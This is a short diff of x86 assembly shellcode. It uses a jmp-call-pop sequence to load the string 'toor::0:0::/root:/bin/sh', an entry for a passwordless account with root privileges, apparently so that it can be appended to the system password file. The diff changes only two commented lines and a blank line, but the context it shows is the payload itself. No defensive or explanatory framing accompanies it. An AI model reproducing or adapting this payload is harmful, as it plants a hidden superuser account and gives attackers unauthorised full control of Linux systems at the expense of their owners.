@@ -10,8 +10,6 @@ _start:
 
 append:
 	pop esi
-	;mov byte [esi+6], 0x30
-	;mov byte [esi+8], 0x30
 	cdq
 	mov byte [esi+24], dl
 
@@ -43,3 +41,4 @@ append:
 stage:
 	call append
 	usr: db "toor::0:0::/root:/bin/shC"
+
